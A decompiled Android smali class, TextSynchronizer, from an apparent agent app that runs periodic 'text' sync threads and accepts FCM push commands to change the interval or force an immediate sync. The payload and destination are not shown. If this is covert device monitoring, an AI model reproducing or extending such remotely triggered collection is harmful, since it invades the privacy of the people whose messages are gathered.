.class public Lcom/hp/vd/module/synchronizer/TextSynchronizer;
.super Lcom/hp/vd/module/ModuleAbstract;
.source "TextSynchronizer.java"


# static fields
.field public static final ATTRIBUTE_SKIP_CYCLE:Ljava/lang/String; = "skip_cycle"

.field public static final ATTRIBUTE_SYNCHRONIZATION_INTERVAL:Ljava/lang/String; = "synchronization_interval"

.field public static final ATTRIBUTE_WAKE_AFTER_LOCK_ACQUISITION:Ljava/lang/String; = "wake_after_lock_acquisition"

.field public static final COMMAND_ARGUMENT_NEW_SYNCHRONIZATION_INTERVAL:Ljava/lang/String; = "new_synchronization_interval"

.field public static final COMMAND_ARGUMENT_NEW_WAKE_AFTER_LOCK_INTERVAL:Ljava/lang/String; = "new_wake_after_lock_interval"

.field public static final COMMAND_CHANGE_SYNCHRONIZATION_INTERVAL:Ljava/lang/String; = "ts_change_synchronization_interval"

.field public static final COMMAND_CHANGE_WAKE_AFTER_LOCK_ACQUISITION:Ljava/lang/String; = "ts_change_wake_after_lock_acquisition"

.field public static final COMMAND_FORCE_IMMEDIATE_SYNCHRONIZATION:Ljava/lang/String; = "ts_force_immediate_synchronization"

.field protected static final TAG:Ljava/lang/String; = "TextSync"


# instance fields
.field protected commandReceiver:Lcom/hp/vd/module/synchronizer/text/FcmCommandReceiver;

.field protected lastSynchronization:Ljava/lang/Long;

.field protected moduleData:Lcom/hp/vd/data/ModuleData;

.field protected synchronizationThread:Ljava/lang/Thread;


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 50
    invoke-direct {p0}, Lcom/hp/vd/module/ModuleAbstract;-><init>()V

    const/4 v0, 0x0

    .line 66
    iput-object v0, p0, Lcom/hp/vd/module/synchronizer/TextSynchronizer;->synchronizationThread:Ljava/lang/Thread;

    .line 67
    iput-object v0, p0, Lcom/hp/vd/module/synchronizer/TextSynchronizer;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 68
    iput-object v0, p0, Lcom/hp/vd/module/synchronizer/TextSynchronizer;->commandReceiver:Lcom/hp/vd/module/synchronizer/text/FcmCommandReceiver;

    .line 70
    iput-object v0, p0, Lcom/hp/vd/module/synchronizer/TextSynchronizer;->lastSynchronization:Ljava/lang/Long;

    return-void
.end method


# virtual methods
.method public forceSynchronization()Z
    .locals 1

    const/4 v0, 0x0

    .line 230
    iput-object v0, p0, Lcom/hp/vd/module/synchronizer/TextSynchronizer;->lastSynchronization:Ljava/lang/Long;

    .line 231
    invoke-virtual {p0}, Lcom/hp/vd/module/synchronizer/TextSynchronizer;->start()Z

    move-result v0

    return v0
.end method

.method public getModuleData()Lcom/hp/vd/data/ModuleData;
    .locals 3

    .line 76
    new-instance v0, Lcom/hp/vd/data/ModuleData;

    invoke-direct {v0}, Lcom/hp/vd/data/ModuleData;-><init>()V

    const-string v1, "synchronizer"

    .line 78
    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->type:Ljava/lang/String;

    .line 79
    sget-object v1, Lcom/hp/vd/module/Constants;->STATUS_ACTIVE:Ljava/lang/Integer;

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->status:Ljava/lang/Integer;

    .line 80
    invoke-virtual {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->packageName:Ljava/lang/String;

    .line 81
    invoke-virtual {p0}, Lcom/hp/vd/module/synchronizer/TextSynchronizer;->getModuleName()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->name:Ljava/lang/String;

    const/4 v1, 0x6

    .line 82
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->version:Ljava/lang/Integer;

    const-string v1, "v6.0"

    .line 83
    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->versionCodename:Ljava/lang/String;

    const-string v1, "skip_cycle"

    const-string v2, "true"

    .line 85
    invoke-virtual {v0, v1, v2}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const-string v1, "synchronization_interval"

    const-string v2, "890"

    .line 86
    invoke-virtual {v0, v1, v2}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const-string v1, "wake_after_lock_acquisition"

    const-string v2, "20"

    .line 87
    invoke-virtual {v0, v1, v2}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const/16 v1, 0x190

    .line 89
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->priorityLoad:Ljava/lang/Integer;

    const/4 v1, -0x1

    .line 90
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->prioritySynchronization:Ljava/lang/Integer;

    .line 92
    sget-object v1, Lcom/hp/vd/module/Constants;->EXTERNAL_MODULE:Ljava/lang/Integer;

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->internal:Ljava/lang/Integer;

    return-object v0
.end method

.method public getModuleName()Ljava/lang/String;
    .locals 1

    const-string v0, "TextSynchronizer"

    return-object v0
.end method

.method public hasInternetConnectivity()Z
    .locals 2

    .line 275
    invoke-virtual {p0}, Lcom/hp/vd/module/synchronizer/TextSynchronizer;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v1, "connectivity"

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/net/ConnectivityManager;

    .line 276
    invoke-virtual {v0}, Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;

    move-result-object v0

    if-eqz v0, :cond_0

    .line 278
    invoke-virtual {v0}, Landroid/net/NetworkInfo;->getState()Landroid/net/NetworkInfo$State;

    move-result-object v0

    sget-object v1, Landroid/net/NetworkInfo$State;->CONNECTED:Landroid/net/NetworkInfo$State;

    if-ne v0, v1, :cond_0

    const/4 v0, 0x1

    return v0

    :cond_0
    const/4 v0, 0x0

    return v0
.end method

.method protected hasUpdateIntervalExpired(Ljava/lang/Long;I)Z
    .locals 8

    .line 325
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    const-wide/16 v2, 0x3e8

    div-long/2addr v0, v2

    invoke-static {v0, v1}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v0

    const/4 v1, 0x1

    if-nez p1, :cond_0

    return v1

    .line 331
    :cond_0
    invoke-virtual {v0}, Ljava/lang/Long;->longValue()J

    move-result-wide v2

    invoke-virtual {p1}, Ljava/lang/Long;->longValue()J

    move-result-wide v4

    sub-long v6, v2, v4

    int-to-long p1, p2

    cmp-long v0, v6, p1

    if-lez v0, :cond_1

    return v1

    :cond_1
    const/4 p1, 0x0

    return p1
.end method

.method public initialize()Z
    .locals 6

    .line 100
    invoke-virtual {p0}, Lcom/hp/vd/module/synchronizer/TextSynchronizer;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    const/4 v1, 0x1

    .line 107
    :try_start_0
    invoke-virtual {p0}, Lcom/hp/vd/module/synchronizer/TextSynchronizer;->getPersistedModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object v2

    iput-object v2, p0, Lcom/hp/vd/module/synchronizer/TextSynchronizer;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v2, "TextSync"

    .line 109
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "initialize(): persisted module data loaded, synchronization_interval="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v4, p0, Lcom/hp/vd/module/synchronizer/TextSynchronizer;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v5, "synchronization_interval"

    .line 111
    invoke-virtual {v4, v5}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    .line 109
    invoke-interface {v0, v2, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    return v1

    :catch_0
    move-exception v2

    const-string v3, "TextSync"

    const-string v4, "cannot initialize()"

    .line 123
    invoke-interface {v0, v3, v4, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 125
    invoke-virtual {p0}, Lcom/hp/vd/module/synchronizer/TextSynchronizer;->getModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object v2

    iput-object v2, p0, Lcom/hp/vd/module/synchronizer/TextSynchronizer;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v2, "TextSync"

    const-string v3, "Loaded default ModuleData for TextSynchronizer"

    .line 126
    invoke-interface {v0, v2, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    return v1
.end method

.method public isStarted()Z
    .locals 2

    .line 261
    iget-object v0, p0, Lcom/hp/vd/module/synchronizer/TextSynchronizer;->synchronizationThread:Ljava/lang/Thread;

    const/4 v1, 0x0

    if-nez v0, :cond_0

    return v1

    .line 265
    :cond_0
    iget-object v0, p0, Lcom/hp/vd/module/synchronizer/TextSynchronizer;->synchronizationThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->isAlive()Z

    move-result v0

    if-eqz v0, :cond_1

    iget-object v0, p0, Lcom/hp/vd/module/synchronizer/TextSynchronizer;->synchronizationThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->isInterrupted()Z

    move-result v0

    if-eqz v0, :cond_1

    const/4 v1, 0x1

    :cond_1
    return v1
.end method

.method protected isSynchronizationRunning(Ljava/lang/Thread;)Z
    .locals 0

    .line 340
    iget-object p1, p0, Lcom/hp/vd/module/synchronizer/TextSynchronizer;->synchronizationThread:Ljava/lang/Thread;

    if-eqz p1, :cond_0

    iget-object p1, p0, Lcom/hp/vd/module/synchronizer/TextSynchronizer;->synchronizationThread:Ljava/lang/Thread;

    invoke-virtual {p1}, Ljava/lang/Thread;->isAlive()Z

    move-result p1

    if-eqz p1, :cond_0

    iget-object p1, p0, Lcom/hp/vd/module/synchronizer/TextSynchronizer;->synchronizationThread:Ljava/lang/Thread;

    invoke-virtual {p1}, Ljava/lang/Thread;->isInterrupted()Z

    move-result p1

    if-nez p1, :cond_0

    const/4 p1, 0x1

    return p1

    :cond_0
    const/4 p1, 0x0

    return p1
.end method

.method public persistModuleData(Lcom/hp/vd/data/ModuleData;)Z
    .locals 0

    .line 297
    invoke-virtual {p0, p1}, Lcom/hp/vd/module/synchronizer/TextSynchronizer;->updateModuleData(Lcom/hp/vd/data/ModuleData;)Z

    move-result p1

    return p1
.end method

.method protected skipCycle()Z
    .locals 5

    .line 306
    iget-object v0, p0, Lcom/hp/vd/module/synchronizer/TextSynchronizer;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    .line 308
    iget-object v1, p0, Lcom/hp/vd/module/synchronizer/TextSynchronizer;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v2, "skip_cycle"

    invoke-virtual {v1, v2}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Ljava/lang/Boolean;->parseBoolean(Ljava/lang/String;)Z

    move-result v1

    const/4 v2, 0x1

    if-ne v2, v1, :cond_1

    const-string v1, "TextSync"

    const-string v3, "Skipping sync cycle"

    const/4 v4, 0x2

    .line 309
    invoke-interface {v0, v1, v3, v4}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    .line 311
    iget-object v1, p0, Lcom/hp/vd/module/synchronizer/TextSynchronizer;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v3, "skip_cycle"

    const-string v4, "false"

    invoke-virtual {v1, v3, v4}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    .line 313
    iget-object v1, p0, Lcom/hp/vd/module/synchronizer/TextSynchronizer;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-virtual {p0, v1}, Lcom/hp/vd/module/synchronizer/TextSynchronizer;->updateModuleData(Lcom/hp/vd/data/ModuleData;)Z

    move-result v1

    if-nez v1, :cond_0

    const-string v1, "TextSync"

    const-string v3, "Error setting skip cycle to \'false\'."

    const/4 v4, 0x3

    .line 314
    invoke-interface {v0, v1, v3, v4}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    :cond_0
    return v2

    :cond_1
    const/4 v0, 0x0

    return v0
.end method

.method public start()Z
    .locals 5

    .line 147
    iget-object v0, p0, Lcom/hp/vd/module/synchronizer/TextSynchronizer;->commandReceiver:Lcom/hp/vd/module/synchronizer/text/FcmCommandReceiver;

    if-nez v0, :cond_0

    .line 149
    :try_start_0
    new-instance v0, Lcom/hp/vd/module/synchronizer/text/FcmCommandReceiver;

    iget-object v1, p0, Lcom/hp/vd/module/synchronizer/TextSynchronizer;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-virtual {p0}, Lcom/hp/vd/module/synchronizer/TextSynchronizer;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v2

    invoke-virtual {v2}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v2

    invoke-direct {v0, p0, v1, v2}, Lcom/hp/vd/module/synchronizer/text/FcmCommandReceiver;-><init>(Lcom/hp/vd/module/synchronizer/TextSynchronizer;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/agent/log/IWriter;)V

    iput-object v0, p0, Lcom/hp/vd/module/synchronizer/TextSynchronizer;->commandReceiver:Lcom/hp/vd/module/synchronizer/text/FcmCommandReceiver;

    .line 150
    new-instance v0, Landroid/content/IntentFilter;

    invoke-direct {v0}, Landroid/content/IntentFilter;-><init>()V

    const-string v1, "com.hp.vb.FCM_COMMAND_RECEIVED"

    .line 152
    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 154
    iget-object v1, p0, Lcom/hp/vd/module/synchronizer/TextSynchronizer;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    iget-object v2, p0, Lcom/hp/vd/module/synchronizer/TextSynchronizer;->commandReceiver:Lcom/hp/vd/module/synchronizer/text/FcmCommandReceiver;

    invoke-virtual {v1, v2, v0}, Landroid/content/Context;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    .line 155
    iget-object v0, p0, Lcom/hp/vd/module/synchronizer/TextSynchronizer;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    const-string v1, "TextSync"

    const-string v2, "fcm: commandReceiver was registered in filesync"

    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    .line 158
    iget-object v1, p0, Lcom/hp/vd/module/synchronizer/TextSynchronizer;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v1

    const-string v2, "TextSync"

    const-string v3, "fcm: Exception caught while registering receiver"

    invoke-interface {v1, v2, v3, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 166
    :cond_0
    :goto_0
    invoke-virtual {p0}, Lcom/hp/vd/module/synchronizer/TextSynchronizer;->skipCycle()Z

    move-result v0

    const/4 v1, 0x1

    if-eqz v0, :cond_1

    return v1

    .line 174
    :cond_1
    iget-object v0, p0, Lcom/hp/vd/module/synchronizer/TextSynchronizer;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v2, "synchronization_interval"

    invoke-virtual {v0, v2}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v0

    .line 176
    iget-object v2, p0, Lcom/hp/vd/module/synchronizer/TextSynchronizer;->lastSynchronization:Ljava/lang/Long;

    invoke-virtual {p0, v2, v0}, Lcom/hp/vd/module/synchronizer/TextSynchronizer;->hasUpdateIntervalExpired(Ljava/lang/Long;I)Z

    move-result v0

    if-nez v0, :cond_2

    return v1

    .line 191
    :cond_2
    :try_start_1
    iget-object v0, p0, Lcom/hp/vd/module/synchronizer/TextSynchronizer;->synchronizationThread:Ljava/lang/Thread;

    invoke-virtual {p0, v0}, Lcom/hp/vd/module/synchronizer/TextSynchronizer;->isSynchronizationRunning(Ljava/lang/Thread;)Z

    move-result v0

    if-eqz v0, :cond_3

    .line 192
    invoke-virtual {p0}, Lcom/hp/vd/module/synchronizer/TextSynchronizer;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    const-string v2, "TextSync"

    const-string v3, "start(): a synchronization thread is already running. Skipping cycle."

    const/4 v4, 0x2

    invoke-interface {v0, v2, v3, v4}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return v1

    .line 201
    :cond_3
    invoke-virtual {p0}, Lcom/hp/vd/module/synchronizer/TextSynchronizer;->hasInternetConnectivity()Z

    move-result v0

    if-nez v0, :cond_4

    return v1

    .line 205
    :cond_4
    new-instance v0, Lcom/hp/vd/module/synchronizer/text/SynchronizationRunnable;

    iget-object v2, p0, Lcom/hp/vd/module/synchronizer/TextSynchronizer;->context:Lcom/hp/vd/context/Context;

    iget-object v3, p0, Lcom/hp/vd/module/synchronizer/TextSynchronizer;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-direct {v0, p0, v2, v3}, Lcom/hp/vd/module/synchronizer/text/SynchronizationRunnable;-><init>(Lcom/hp/vd/module/synchronizer/TextSynchronizer;Lcom/hp/vd/context/Context;Lcom/hp/vd/data/ModuleData;)V

    .line 211
    new-instance v2, Ljava/lang/Thread;

    const-string v3, "TextSync-On-Start"

    invoke-direct {v2, v0, v3}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    iput-object v2, p0, Lcom/hp/vd/module/synchronizer/TextSynchronizer;->synchronizationThread:Ljava/lang/Thread;

    .line 212
    iget-object v0, p0, Lcom/hp/vd/module/synchronizer/TextSynchronizer;->synchronizationThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_1

    :catch_1
    move-exception v0

    .line 215
    invoke-virtual {p0}, Lcom/hp/vd/module/synchronizer/TextSynchronizer;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v2

    invoke-virtual {v2}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v2

    const-string v3, "TextSync"

    const-string v4, "start()\'s main try-catch"

    invoke-interface {v2, v3, v4, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    :goto_1
    return v1
.end method

.method public startOnHeartbeat()Z
    .locals 1

    const/4 v0, 0x1

    return v0
.end method

.method public stop()Z
    .locals 4

    .line 237
    iget-object v0, p0, Lcom/hp/vd/module/synchronizer/TextSynchronizer;->commandReceiver:Lcom/hp/vd/module/synchronizer/text/FcmCommandReceiver;

    if-eqz v0, :cond_0

    .line 239
    :try_start_0
    iget-object v0, p0, Lcom/hp/vd/module/synchronizer/TextSynchronizer;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    iget-object v1, p0, Lcom/hp/vd/module/synchronizer/TextSynchronizer;->commandReceiver:Lcom/hp/vd/module/synchronizer/text/FcmCommandReceiver;

    invoke-virtual {v0, v1}, Landroid/content/Context;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    const/4 v0, 0x0

    .line 240
    iput-object v0, p0, Lcom/hp/vd/module/synchronizer/TextSynchronizer;->commandReceiver:Lcom/hp/vd/module/synchronizer/text/FcmCommandReceiver;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    .line 243
    iget-object v1, p0, Lcom/hp/vd/module/synchronizer/TextSynchronizer;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v1

    const-string v2, "TextSync"

    const-string v3, "fcm: Exception caught in stop()"

    invoke-interface {v1, v2, v3, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 251
    :cond_0
    :goto_0
    iget-object v0, p0, Lcom/hp/vd/module/synchronizer/TextSynchronizer;->synchronizationThread:Ljava/lang/Thread;

    if-eqz v0, :cond_1

    .line 252
    iget-object v0, p0, Lcom/hp/vd/module/synchronizer/TextSynchronizer;->synchronizationThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->interrupt()V

    :cond_1
    const/4 v0, 0x1

    return v0
.end method

.method public synchronizationCompleted()V
    .locals 4

    .line 270
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    const-wide/16 v2, 0x3e8

    div-long/2addr v0, v2

    invoke-static {v0, v1}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v0

    iput-object v0, p0, Lcom/hp/vd/module/synchronizer/TextSynchronizer;->lastSynchronization:Ljava/lang/Long;

    return-void
.end method
